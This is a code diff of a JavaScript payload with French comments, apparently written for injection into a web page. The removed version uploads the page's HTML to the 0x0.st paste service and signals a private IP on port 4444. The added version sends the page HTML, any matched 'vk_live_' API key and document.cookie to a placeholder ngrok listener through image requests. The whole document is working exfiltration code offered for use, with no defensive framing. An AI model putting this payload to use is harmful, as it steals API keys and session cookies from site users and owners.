@@ -1,27 +1,19 @@
-// Exfiltrer vers 0x0.st (service public de paste)
-function exfiltrate(data) {
-    // Envoyer les données vers 0x0.st
-    const formData = new FormData();
-    formData.append('file', new Blob([data]), 'exfil.txt');
-    
-    fetch('https://0x0.st', {
-        method: 'POST',
-        mode: 'cors',
-        body: formData
-    })
-    .then(r => r.text())
-    .then(url => {
-        // Une fois le paste créé, envoyer l'URL via netcat
-        new Image().src = "http://10.139.32.179:4444/?paste=" + encodeURIComponent(url);
-    });
+// Utiliser l'URL ngrok à la place de votre IP
+const listener = "https://VOTRE_NGROK_URL.ngrok.io";
+
+function send(data) {
+    new Image().src = listener + "/?data=" + encodeURIComponent(data);
 }
 
-// Exfiltrer la page actuelle
-const pageHTML = document.documentElement.outerHTML;
-exfiltrate("URL: " + location.href + "\n\n" + pageHTML);
+// Exfiltrer le HTML de la page
+const html = document.documentElement.outerHTML;
+send("PAGE: " + html.substring(0, 2000));
 
 // Chercher l'API key
-const keyMatch = pageHTML.match(/vk_live_[a-f0-9]{40}/);
+const keyMatch = html.match(/vk_live_[a-f0-9]{40}/);
 if (keyMatch) {
-    exfiltrate("API KEY FOUND: " + keyMatch[0]);
+    send("API_KEY: " + keyMatch[0]);
 }
+
+// Envoyer le cookie
+send("COOKIE: " + document.cookie);
